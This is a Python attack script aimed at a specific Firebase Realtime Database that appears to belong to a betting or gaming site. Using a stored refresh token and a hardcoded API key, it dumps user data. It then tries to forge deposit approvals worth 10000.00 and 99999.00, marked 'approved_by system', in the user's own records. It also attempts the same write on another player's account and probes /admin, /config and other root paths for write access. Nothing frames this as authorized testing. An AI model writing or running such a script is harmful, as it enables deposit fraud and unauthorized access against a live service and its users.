#!/usr/bin/env python3
"""probe_rtdb_deposit_approve.py — Explore DEPOSIT_APPROVE structure and test write access."""
import json
import requests
import asyncio
import websockets
import time

API_KEY = "AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE"
RTDB_URL = "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app"
USER_ID = "ff6c08fb-c109-4c33-9b9f-342e2aca3822"

def refresh_token():
    refresh_tok = open("fb_refresh_token_new.txt").read().strip()
    url = f"https://securetoken.googleapis.com/v1/token?key={API_KEY}"
    r = requests.post(url, data={"grant_type": "refresh_token", "refresh_token": refresh_tok}, timeout=15)
    return r.json().get("id_token") if r.ok else None

# 1. REST API - fetch full user data
print("=== 1. Fetching full user data via REST ===")
id_token = refresh_token()
if not id_token:
    print("Failed to get ID token")
    exit(1)

# Get full user data (not shallow)
url = f"{RTDB_URL}/users/{USER_ID}.json?auth={id_token}"
r = requests.get(url, timeout=15)
print(f"GET /users/{USER_ID}: {r.status_code}")
if r.ok:
    data = r.json()
    print(f"Full data:\n{json.dumps(data, indent=2)}")

# 2. Try to write to DEPOSIT_APPROVE
print("\n\n=== 2. Testing WRITE access ===")

# Test 1: Try to add a new deposit approval record
test_deposit_id = "00000000-0000-0000-0000-000000000099"
test_payload = {
    "amount": "10000.00",
    "approve_status": "success",
    "approved_by": "system",
    "status": "success",
    "timestamp": int(time.time() * 1000),
    "uid": USER_ID
}

# Try PUT to create new record
url = f"{RTDB_URL}/users/{USER_ID}/DEPOSIT_APPROVE/{test_deposit_id}.json?auth={id_token}"
r = requests.put(url, json=test_payload, timeout=15)
print(f"\nPUT /users/{USER_ID}/DEPOSIT_APPROVE/{test_deposit_id}: {r.status_code}")
print(f"Response: {r.text[:300]}")

# Test 2: Try PATCH (update)
url = f"{RTDB_URL}/users/{USER_ID}/DEPOSIT_APPROVE/{test_deposit_id}.json?auth={id_token}"
r = requests.patch(url, json={"amount": "99999.00"}, timeout=15)
print(f"\nPATCH: {r.status_code}")
print(f"Response: {r.text[:300]}")

# Test 3: Try POST (push new child)
url = f"{RTDB_URL}/users/{USER_ID}/DEPOSIT_APPROVE.json?auth={id_token}"
r = requests.post(url, json=test_payload, timeout=15)
print(f"\nPOST: {r.status_code}")
print(f"Response: {r.text[:300]}")

# 3. Check if our write worked
print("\n\n=== 3. Verifying writes ===")
url = f"{RTDB_URL}/users/{USER_ID}/DEPOSIT_APPROVE.json?auth={id_token}"
r = requests.get(url, timeout=15)
print(f"GET DEPOSIT_APPROVE: {r.status_code}")
if r.ok:
    data = r.json()
    print(f"All approvals:\n{json.dumps(data, indent=2)[:1000]}")

# 4. Try writing to OTHER user's path (cross-user)
print("\n\n=== 4. Cross-user write test ===")
other_user = "eea830ab-b187-4f21-9b79-28e2773b2f6b"  # vak88z2 player
url = f"{RTDB_URL}/users/{other_user}/DEPOSIT_APPROVE/{test_deposit_id}.json?auth={id_token}"
r = requests.put(url, json=test_payload, timeout=15)
print(f"PUT to other user: {r.status_code}")
print(f"Response: {r.text[:300]}")

# 5. Try writing to root paths
print("\n\n=== 5. Root path write test ===")
for path in ["/config", "/admin", "/system", "/pending"]:
    url = f"{RTDB_URL}{path}/test.json?auth={id_token}"
    r = requests.put(url, json={"test": 1}, timeout=10)
    if r.status_code != 401:
        print(f"PUT {path}/test: {r.status_code} - {r.text[:100]}")

print("\n=== Done ===")
